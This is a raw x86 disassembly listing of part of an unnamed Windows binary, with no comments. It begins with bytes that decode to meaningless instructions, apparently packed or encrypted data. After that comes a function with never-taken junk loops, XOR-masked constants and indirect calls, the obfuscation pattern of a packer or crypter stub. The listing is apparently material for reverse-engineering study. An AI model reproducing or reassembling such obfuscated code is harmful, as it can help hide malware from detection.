  414ca4:	sub    ecx,eax
  414ca6:	(bad)  
  414ca7:	in     al,dx
  414ca8:	(bad)  
  414ca9:	push   ds
  414caa:	mov    al,0x98
  414cac:	int3   
  414cad:	inc    eax
  414cae:	test   DWORD PTR [ebp+ebp*4+0x5ea70949],ebx
  414cb5:	fisttp QWORD PTR [eax]
  414cb7:	mov    edi,0x6840c2fa
  414cbc:	xchg   edx,eax
  414cbd:	stos   DWORD PTR es:[edi],eax
  414cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cbf:	cmp    dh,BYTE PTR [edx+0x2c]
  414cc2:	popa   
  414cc3:	call   0xd8db09a3
  414cc8:	int3   
  414cc9:	rcl    DWORD PTR [edx-0x655923a5],1
  414ccf:	pop    eax
  414cd0:	sbb    edx,DWORD PTR [ebp-0x5e]
  414cd3:	(bad)  [edi]
  414cd5:	inc    esp
  414cd6:	test   DWORD PTR [ebx-0x2ea18a55],edi
  414cdc:	xor    al,0xe6
  414cde:	sbb    edi,DWORD PTR [edx-0x7e]
  414ce1:	jp     0x414c6c
  414ce3:	outs   dx,DWORD PTR ds:[esi]
  414ce4:	inc    esp
  414ce5:	enter  0xd939,0x3d
  414ce9:	mov    al,0xdb
  414ceb:	popa   
  414cec:	retf   
  414ced:	inc    esi
  414cee:	sub    bh,BYTE PTR [eax]
  414cf0:	jg     0x414cd1
  414cf2:	ins    BYTE PTR es:[edi],dx
  414cf3:	leave  
  414cf4:	pushf  
  414cf5:	ins    BYTE PTR es:[edi],dx
  414cf6:	cmc    
  414cf7:	mov    ebx,0x77260a79
  414cfc:	sahf   
  414cfd:	and    BYTE PTR [ebx],cl
  414cff:	call   0xcc5b:0xad13f82a
  414d06:	jge    0x414ce8
  414d08:	outs   dx,BYTE PTR ds:[esi]
  414d09:	sbb    eax,0x53165511
  414d0e:	scas   al,BYTE PTR es:[edi]
  414d0f:	xor    eax,0x36175938
  414d14:	add    ecx,DWORD PTR [edx+esi*2-0x20]
  414d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d19:	rcr    DWORD PTR [ecx-0x402a43e7],0x67
  414d20:	pop    ds
  414d21:	repz sub BYTE PTR [ecx+0x6871ef71],ah
  414d28:	fwait
  414d29:	adc    eax,0xb825300
  414d2e:	(bad)  
  414d2f:	jnp    0x414cf0
  414d31:	aam    0x55
  414d33:	stos   DWORD PTR es:[edi],eax
  414d34:	mov    al,ds:0x48c2d3b8
  414d39:	pop    eax
  414d3a:	mov    eax,ds:0xa92257fa
  414d3f:	add    dh,ah
  414d41:	jle    0x414d2d
  414d43:	pop    ecx
  414d44:	jnp    0x414ce7
  414d46:	mov    dh,0xd0
  414d48:	mov    ecx,0x5cb3a191
  414d4d:	cdq    
  414d4e:	fisubr WORD PTR [edi+ebx*4+0x150fcb41]
  414d55:	and    edx,DWORD PTR [ecx]
  414d57:	jge    0x414d8a
  414d59:	mov    ebp,0x175aa253
  414d5e:	in     al,dx
  414d5f:	lock es jae 0x414d44
  414d63:	(bad)  
  414d64:	repnz cmc 
  414d66:	ror    BYTE PTR [edi+0x3a],cl
  414d69:	sbb    al,0x89
  414d6b:	pop    ebp
  414d6c:	mov    bl,0x37
  414d6e:	or     al,0xa6
  414d70:	adc    edx,DWORD PTR [ebx]
  414d72:	add    ah,BYTE PTR [esi-0x4]
  414d75:	xlat   BYTE PTR ds:[ebx]
  414d76:	mov    ds:0x6546e7de,eax
  414d7b:	call   0x872ebb59
  414d80:	int3   
  414d81:	rcr    DWORD PTR [ebx-0x13],cl
  414d84:	dec    sp
  414d86:	xchg   ecx,ebp
  414d88:	jae    0x414d51
  414d8a:	ror    BYTE PTR [edx],cl
  414d8c:	test   al,0xba
  414d8e:	inc    edi
  414d8f:	call   0x5865:0xcde337b6
  414d96:	inc    edx
  414d97:	inc    eax
  414d98:	imul   eax,DWORD PTR [ecx+0x3c],0x11
  414d9c:	int    0x32
  414d9e:	sbb    al,0xd5
  414da0:	fwait
  414da1:	daa    
  414da2:	pushf  
  414da3:	pop    ds
  414da4:	xor    BYTE PTR [ebx-0x3f5c54b0],0x13
  414dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dac:	popf   
  414dad:	mov    BYTE PTR [edi],bh
  414daf:	inc    ebx
  414db0:	adc    DWORD PTR [edi+0x362ab239],edi
  414db6:	bound  ebx,QWORD PTR [ebx-0x794e7bf0]
  414dbc:	inc    esi
  414dbd:	lock outs dx,DWORD PTR ss:[esi]
  414dc0:	sbb    al,bl
  414dc2:	jns    0x414dbc
  414dc4:	ins    DWORD PTR es:[edi],dx
  414dc5:	daa    
  414dc6:	bound  edi,QWORD PTR [ecx]
  414dc8:	cmp    al,ah
  414dca:	daa    
  414dcb:	mov    eax,ebx
  414dcd:	inc    esi
  414dce:	ret    0x363d
  414dd1:	ret    0xd205
  414dd4:	mov    ds:0x61726fe4,eax
  414dd9:	in     eax,0x4f
  414ddb:	pop    ss
  414ddc:	mov    eax,es:0x999dbb2f
  414de2:	jnp    0x414dbf
  414de4:	imul   edx,DWORD PTR [edi],0x633cf164
  414dea:	(bad)  
  414deb:	or     eax,0x7ef6e33e
  414df0:	jo     0x414dec
  414df2:	mov    fs,WORD PTR [ebx]
  414df4:	xor    al,0x45
  414df6:	es gs test esp,0x92f34da8
  414dfe:	pop    ds
  414dff:	sub    bl,bl
  414e01:	sbb    DWORD PTR ds:0x5133988c,0x4063dff8
  414e0b:	pusha  
  414e0c:	loope  0x414e53
  414e0e:	pop    ds
  414e0f:	pop    esp
  414e10:	push   ebp
  414e11:	push   ss
  414e12:	lds    ebp,FWORD PTR [edi]
  414e14:	xchg   edi,eax
  414e15:	out    dx,al
  414e16:	and    BYTE PTR [ebx],0x2e
  414e19:	xor    al,0x54
  414e1b:	adc    eax,0x1be4cf28
  414e20:	fnstcw WORD PTR [ecx]
  414e22:	jge    0x414e87
  414e24:	outs   dx,DWORD PTR ds:[esi]
  414e25:	mov    eax,ds:0x860fcb62
  414e2a:	data16 lods al,BYTE PTR ds:[esi]
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a815
  414e44:	xor    DWORD PTR ds:0x42a791,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7d9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a861,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a861
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a861,eax
  414e70:	cmp    DWORD PTR ds:0x42a861,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a861,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a86d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a821
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a819,0x42a851
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a821,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a855,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a795
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a865,0x42a785
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7d1,0x42a861
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a821,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a789,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a81d,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a81d
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a81d,edi
  414f60:	cmp    DWORD PTR ds:0x42a81d,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a81d,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a829
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a81d,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a81d
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a81d,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7d5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7e9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a78d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a865,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a869,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7d9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a825,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a865,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a869,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a869
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a869,ecx
  415032:	cmp    DWORD PTR ds:0x42a869,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a869,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a891
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a811,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a8a5,0x42a7d5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7e1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7e5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a899,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a899
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a899,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a899,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a899,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a85d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a86d
  4150eb:	mov    DWORD PTR ds:0x42a85d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7d1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a811
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a895,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a895
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a895,ecx
  415120:	cmp    DWORD PTR ds:0x42a895,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a895,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a77d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a77d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a77d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a77d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a9bf
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a77d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a77d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a77d,ecx
  415190:	cmp    DWORD PTR ds:0x42a77d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a7a1
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7e1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7e1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7e1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7e1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7e1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7e1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7e1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7e1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7e9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7e9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7e9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7e9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7e9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a795
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7e9,0x42a8a1
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a891,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a861,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a859,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a785,0x42a89d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a85d,0x42a779
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7ed,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7ed
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7ed,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7ed,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7ed,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a869
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a7a1,0x10
  415329:	cmp    DWORD PTR ds:0x42a7a1,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a7a1,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a7a1,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a7a1
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a7a1,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a7a1
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a7a1,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a811,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a811
  415393:	inc    eax
  415394:	mov    ds:0x42a811,eax
  415399:	cmp    DWORD PTR ds:0x42a811,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a811,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a779
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7dd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a851,0x0
  4153ed:	mov    eax,ds:0x42a851
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a851,eax
  4153f8:	cmp    DWORD PTR ds:0x42a851,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a952
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a851,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a851
  41542b:	inc    eax
  41542c:	mov    ds:0x42a851,eax
  415431:	cmp    DWORD PTR ds:0x42a851,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a781,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a8ad,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a8ad,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a8ad,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a789
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a8ad,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a8ad
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a8ad,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a8ad
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a8ad,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7d9
  4154c7:	and    edx,DWORD PTR ds:0x42a86d
  4154cd:	mov    DWORD PTR ds:0x42a7d9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a7a1,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a855,0x42a811
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a855,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7e5,0x42a825
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a815,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a781,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7dd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7dd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7dd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7dd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a865
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7dd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a89d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a89d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a89d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a89d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a89d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
